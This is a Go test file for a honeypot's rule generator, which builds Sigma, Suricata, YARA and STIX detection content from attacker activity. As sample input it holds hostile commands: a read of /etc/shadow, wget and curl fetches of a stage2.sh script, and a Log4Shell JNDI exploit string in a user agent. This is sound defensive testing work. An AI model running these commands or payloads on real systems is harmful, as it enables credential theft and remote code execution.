package forge

import (
	"encoding/json"
	"fmt"
	"regexp"
	"strings"
	"testing"
	"time"

	"gopkg.in/yaml.v3"

	"github.com/sauron666/Honeypot/internal/engagement"
	"github.com/sauron666/Honeypot/internal/event"
)

func fixedForge() *Forge {
	f := New()
	f.Now = func() time.Time { return time.Date(2026, 3, 4, 10, 0, 0, 0, time.UTC) }
	return f
}

func cmdEvent(cmd string) *event.Event {
	e := event.New(event.ClassCommandExecuted, 1, event.SeverityHigh, event.PlaneHoneyd)
	e.Mirage.DecoyID, e.Mirage.Service, e.Mirage.EngagementID = "dcy-web01", "ssh", "eng_1"
	e.WithSrc("198.51.100.7", 4444).WithMessage("command: %s", cmd)
	e.Set("command", cmd)
	return e
}

func sampleEngagement() *engagement.Engagement {
	return &engagement.Engagement{
		ID: "eng_1", SrcIP: "198.51.100.7",
		StartedAt: time.Date(2026, 3, 4, 9, 0, 0, 0, time.UTC),
		LastSeen:  time.Date(2026, 3, 4, 9, 42, 0, 0, time.UTC),
		Decoys:    []string{"dcy-web01"}, Services: []string{"ssh", "http"},
		Techniques: []string{"T1110", "T1003.008", "T1105"},
		Events:     42, RiskScore: 88, Authenticated: true,
		HoneytokensHit: []string{"app-db-credential"},
		PayloadURLs:    []string{"http://198.51.100.66/stage2.sh"},
		Summary:        "attacker read planted credentials after authenticating to a decoy",
	}
}

func TestGeneratedSigmaIsValidYAMLWithRequiredFields(t *testing.T) {
	b := fixedForge().Build(sampleEngagement(), []*event.Event{
		cmdEvent("cat /etc/shadow > /tmp/s"),
		cmdEvent("crontab -l"),
	})

	rules := b.RulesOf(FormatSigma)
	if len(rules) == 0 {
		t.Fatal("no Sigma rules were generated")
	}
	for _, r := range rules {
		var doc map[string]any
		if err := yaml.Unmarshal([]byte(r.Content), &doc); err != nil {
			t.Fatalf("rule %q is not valid YAML: %v\n%s", r.Title, err, r.Content)
		}
		// A rule missing any of these will be rejected by every SIEM that
		// ingests Sigma, which would make the whole feature theatre.
		for _, field := range []string{"title", "id", "logsource", "detection", "level"} {
			if _, ok := doc[field]; !ok {
				t.Errorf("rule %q has no %s field", r.Title, field)
			}
		}
		det, ok := doc["detection"].(map[string]any)
		if !ok || det["condition"] == nil {
			t.Errorf("rule %q has no detection condition", r.Title)
		}
		if id, _ := doc["id"].(string); !regexp.MustCompile(
			`^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$`).MatchString(id) {
			t.Errorf("rule %q has a malformed id %q", r.Title, id)
		}
	}
}

func TestSigmaIDsAreStableAcrossRuns(t *testing.T) {
	// Regenerating a rule for the same observation must not create a duplicate
	// in the SIEM, so the id has to be derived, not random.
	events := []*event.Event{cmdEvent("cat /etc/shadow")}
	a := fixedForge().Build(sampleEngagement(), events)
	b := fixedForge().Build(sampleEngagement(), events)

	if len(a.Rules) != len(b.Rules) {
		t.Fatalf("rule count differs between runs: %d vs %d", len(a.Rules), len(b.Rules))
	}
	for i := range a.Rules {
		if a.Rules[i].ID != b.Rules[i].ID || a.Rules[i].Content != b.Rules[i].Content {
			t.Fatalf("rule %d is not reproducible", i)
		}
	}
}

func TestUbiquitousCommandsAreRejectedNotSignatured(t *testing.T) {
	b := fixedForge().Build(sampleEngagement(), []*event.Event{
		cmdEvent("ls"), cmdEvent("whoami"), cmdEvent("cd /var/www"),
		cmdEvent("ps aux"), cmdEvent("uname -a"),
	})

	if n := len(b.RulesOf(FormatSigma)); n != 0 {
		t.Fatalf("generated %d rules from ubiquitous commands; that feed would be muted within a day", n)
	}
	if len(b.Rejected) < 5 {
		t.Fatalf("only %d rejections recorded; the operator must be able to see what was skipped", len(b.Rejected))
	}
	for _, r := range b.Rejected {
		if r.Reason == "" {
			t.Error("a rejection with no reason is not reviewable")
		}
	}
}

func TestDistinctiveCommandsSurviveEvenWhenShort(t *testing.T) {
	// "cat /etc/shadow" starts with an ordinary command, but the path makes it
	// worth a rule.
	b := fixedForge().Build(sampleEngagement(), []*event.Event{cmdEvent("cat /etc/shadow")})
	rules := b.RulesOf(FormatSigma)
	found := false
	for _, r := range rules {
		if strings.Contains(r.Content, "/etc/shadow") && r.Technique == "T1003.008" {
			found = true
		}
	}
	if !found {
		t.Fatalf("the shadow read did not produce a mapped rule; got %d rules", len(rules))
	}
}

func TestSuricataRulesAreWellFormed(t *testing.T) {
	httpEv := event.New(event.ClassDetectionFinding, 1, event.SeverityHigh, event.PlaneHoneyd)
	httpEv.Mirage.Service = "http"
	httpEv.Set("url_path", "/_ignition/execute-solution").
		Set("findings", []string{"scanner-path:laravel-rce"}).
		Set("user_agent", "sqlmap/1.7.2#stable (https://sqlmap.org)")

	b := fixedForge().Build(sampleEngagement(), []*event.Event{httpEv})
	rules := b.RulesOf(FormatSuricata)
	if len(rules) < 2 {
		t.Fatalf("expected rules for the path, the user agent and the payload URL; got %d", len(rules))
	}

	sids := map[string]bool{}
	sidRe := regexp.MustCompile(`sid:(\d+);`)
	for _, r := range rules {
		c := r.Content
		if !strings.HasPrefix(c, "alert ") {
			t.Errorf("rule %q does not start with an action: %s", r.Title, c)
		}
		if !strings.HasSuffix(strings.TrimSpace(c), ")") {
			t.Errorf("rule %q is not closed: %s", r.Title, c)
		}
		for _, required := range []string{"msg:", "sid:", "rev:", "classtype:"} {
			if !strings.Contains(c, required) {
				t.Errorf("rule %q is missing %s", r.Title, required)
			}
		}
		m := sidRe.FindStringSubmatch(c)
		if m == nil {
			t.Errorf("rule %q has no parseable sid", r.Title)
			continue
		}
		if sids[m[1]] {
			t.Errorf("duplicate sid %s: Suricata would refuse to load the ruleset", m[1])
		}
		sids[m[1]] = true

		// An unescaped quote or semicolon inside msg would break the parser.
		msgStart := strings.Index(c, `msg:"`) + 5
		msgEnd := strings.Index(c[msgStart:], `"`)
		if msgEnd < 0 {
			t.Errorf("rule %q has an unterminated msg", r.Title)
			continue
		}
		if strings.ContainsAny(c[msgStart:msgStart+msgEnd], `";`) {
			t.Errorf("rule %q has an unescaped quote or semicolon in msg", r.Title)
		}
	}
}

func TestBrowserUserAgentsAreRejected(t *testing.T) {
	ev := event.New(event.ClassHTTPActivity, 1, event.SeverityLow, event.PlaneHoneyd)
	ev.Mirage.Service = "http"
	ev.Set("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0")

	b := fixedForge().Build(&engagement.Engagement{ID: "e", SrcIP: "1.2.3.4"}, []*event.Event{ev})
	for _, r := range b.RulesOf(FormatSuricata) {
		if strings.Contains(r.Content, "Mozilla") {
			t.Fatal("a rule on a normal browser user agent would fire on everything")
		}
	}
	if len(b.Rejected) == 0 {
		t.Fatal("the rejection was not recorded")
	}
}

func TestLog4ShellUserAgentIsNotTreatedAsABrowser(t *testing.T) {
	// Exploits hide inside browser-shaped strings; the check must not be fooled.
	ev := event.New(event.ClassDetectionFinding, 1, event.SeverityCritical, event.PlaneHoneyd)
	ev.Mirage.Service = "http"
	ev.Set("user_agent", "Mozilla/5.0 ${jndi:ldap://198.51.100.5:1389/a}")

	b := fixedForge().Build(&engagement.Engagement{ID: "e", SrcIP: "1.2.3.4"}, []*event.Event{ev})
	found := false
	for _, r := range b.RulesOf(FormatSuricata) {
		if strings.Contains(r.Content, "jndi") || strings.Contains(r.Content, "6a6e6469") {
			found = true
		}
	}
	if !found {
		t.Fatal("an exploit string in the user agent must produce a rule")
	}
}

func TestYARARuleFromCapturedPayload(t *testing.T) {
	ev := event.New(event.ClassFileActivity, 1, event.SeverityCritical, event.PlaneHoneyd)
	ev.Mirage.Service = "ftp"
	ev.Set("sha256", "9f2c6b1a3d4e5f60718293a4b5c6d7e8f90112233445566778899aabbccddeeff").
		Set("payload_kind", "elf-binary").
		Set("payload_preview", "GCC: (Debian 12.2.0-14) 12.2.0 .....connect_to_server....."+
			"/tmp/.system_update.....chmod 777 /tmp/x.....kill_competitors")

	b := fixedForge().Build(sampleEngagement(), []*event.Event{ev})
	rules := b.RulesOf(FormatYARA)
	if len(rules) != 1 {
		t.Fatalf("got %d YARA rules, want 1", len(rules))
	}
	c := rules[0].Content
	for _, required := range []string{"rule MIRAGE_captured_", "meta:", "strings:", "condition:", "sha256 = "} {
		if !strings.Contains(c, required) {
			t.Errorf("YARA rule is missing %q:\n%s", required, c)
		}
	}
	// "N of them" rather than "any of them": a single common substring must not
	// be enough to fire.
	if !regexp.MustCompile(`\d+ of them`).MatchString(c) {
		t.Errorf("condition should require several strings:\n%s", c)
	}
	if strings.Count(c, "$s") < 2 {
		t.Errorf("too few strings in the rule:\n%s", c)
	}
}

func TestPayloadWithoutDistinctiveStringsIsRejected(t *testing.T) {
	ev := event.New(event.ClassFileActivity, 1, event.SeverityHigh, event.PlaneHoneyd)
	ev.Set("sha256", strings.Repeat("ab", 32)).Set("payload_preview", "....").Set("payload_kind", "unknown")

	b := fixedForge().Build(sampleEngagement(), []*event.Event{ev})
	if len(b.RulesOf(FormatYARA)) != 0 {
		t.Fatal("a rule built from no distinctive strings would match anything")
	}
}

func TestSTIXBundleIsValid(t *testing.T) {
	b := fixedForge().Build(sampleEngagement(), []*event.Event{cmdEvent("cat /etc/shadow")})

	var bundle map[string]any
	if err := json.Unmarshal([]byte(b.STIX), &bundle); err != nil {
		t.Fatalf("STIX is not valid JSON: %v", err)
	}
	if bundle["type"] != "bundle" {
		t.Fatalf("type = %v, want bundle", bundle["type"])
	}
	objects, _ := bundle["objects"].([]any)
	if len(objects) < 3 {
		t.Fatalf("bundle has %d objects", len(objects))
	}
	var indicators, patterns int
	for _, o := range objects {
		obj := o.(map[string]any)
		id, _ := obj["id"].(string)
		typ, _ := obj["type"].(string)
		if !strings.HasPrefix(id, typ+"--") {
			t.Errorf("object id %q does not match its type %q", id, typ)
		}
		if obj["spec_version"] == nil && typ != "bundle" {
			t.Errorf("object %s has no spec_version", id)
		}
		switch typ {
		case "indicator":
			indicators++
			p, _ := obj["pattern"].(string)
			if !strings.HasPrefix(p, "[") || !strings.HasSuffix(p, "]") {
				t.Errorf("indicator pattern is malformed: %q", p)
			}
		case "attack-pattern":
			patterns++
		}
	}
	if indicators == 0 {
		t.Error("no indicators in the bundle")
	}
	if patterns != len(sampleEngagement().Techniques) {
		t.Errorf("got %d attack patterns, want %d", patterns, len(sampleEngagement().Techniques))
	}
}

func TestIOCsAreExtractedAndDeduplicated(t *testing.T) {
	e1 := cmdEvent("wget http://198.51.100.66/stage2.sh")
	e2 := cmdEvent("curl http://198.51.100.66/stage2.sh")
	up := event.New(event.ClassFileActivity, 1, event.SeverityCritical, event.PlaneHoneyd)
	up.Set("sha256", strings.Repeat("cd", 32)).Set("payload_kind", "elf-binary")
	up2 := event.New(event.ClassFileActivity, 1, event.SeverityCritical, event.PlaneHoneyd)
	up2.Set("sha256", strings.Repeat("cd", 32)).Set("payload_kind", "elf-binary")

	b := fixedForge().Build(sampleEngagement(), []*event.Event{e1, e2, up, up2})

	counts := map[string]int{}
	for _, i := range b.IOCs {
		counts[i.Type+"|"+i.Value]++
	}
	for k, n := range counts {
		if n > 1 {
			t.Errorf("indicator %s appears %d times", k, n)
		}
	}
	var sawIP, sawURL, sawHash bool
	for _, i := range b.IOCs {
		switch i.Type {
		case "ipv4-addr":
			sawIP = true
		case "url":
			sawURL = true
		case "file-hash-sha256":
			sawHash = true
		}
	}
	if !sawIP || !sawURL || !sawHash {
		t.Fatalf("missing indicator types: ip=%v url=%v hash=%v", sawIP, sawURL, sawHash)
	}
}

func TestReportIsCompleteAndActionable(t *testing.T) {
	b := fixedForge().Build(sampleEngagement(), []*event.Event{
		cmdEvent("cat /etc/shadow"),
		cmdEvent("wget http://198.51.100.66/stage2.sh"),
	})
	r := b.Report

	for _, section := range []string{
		"# Incident report", "## Summary", "## Techniques observed", "## Timeline",
		"## Honeytokens taken", "## Indicators", "## Detection content generated", "## Next steps",
	} {
		if !strings.Contains(r, section) {
			t.Errorf("report is missing the %q section", section)
		}
	}
	if !strings.Contains(r, "198.51.100.7") {
		t.Error("report does not name the source")
	}
	if !strings.Contains(r, "88/100") {
		t.Error("report does not carry the risk score")
	}
	// The engagement authenticated, so the report must say to rotate credentials.
	if !strings.Contains(r, "rotate them") {
		t.Error("an authenticated engagement must prompt a credential rotation")
	}
}

func TestSigmaUUIDsAreWellDistributed(t *testing.T) {
	// A UUID whose halves repeat looks generated and, worse, collides sooner.
	seen := map[string]bool{}
	for i := 0; i < 200; i++ {
		id := sigmaUUID(fmt.Sprintf("seed-%d", i))
		if seen[id] {
			t.Fatalf("duplicate uuid at iteration %d", i)
		}
		seen[id] = true
		parts := strings.Split(id, "-")
		if len(parts) != 5 {
			t.Fatalf("malformed uuid %q", id)
		}
		if parts[0] == parts[3]+parts[4][:4] {
			t.Fatalf("uuid %q repeats its own halves", id)
		}
	}
}

func TestSuricataMetadataHasNoSeparators(t *testing.T) {
	ev := event.New(event.ClassDetectionFinding, 1, event.SeverityHigh, event.PlaneHoneyd)
	ev.Mirage.Service = "http"
	ev.Set("url_path", "/wp-login.php").Set("findings", []string{"scanner-path:wordpress", "sql-injection"})

	b := fixedForge().Build(&engagement.Engagement{ID: "e", SrcIP: "1.2.3.4"}, []*event.Event{ev})
	for _, r := range b.RulesOf(FormatSuricata) {
		i := strings.Index(r.Content, "metadata:")
		if i < 0 {
			continue
		}
		rest := r.Content[i+len("metadata:"):]
		value := rest[:strings.Index(rest, ";")]
		if strings.ContainsAny(value, `:,"`) {
			t.Fatalf("metadata value %q contains a separator Suricata would choke on", value)
		}
	}
}
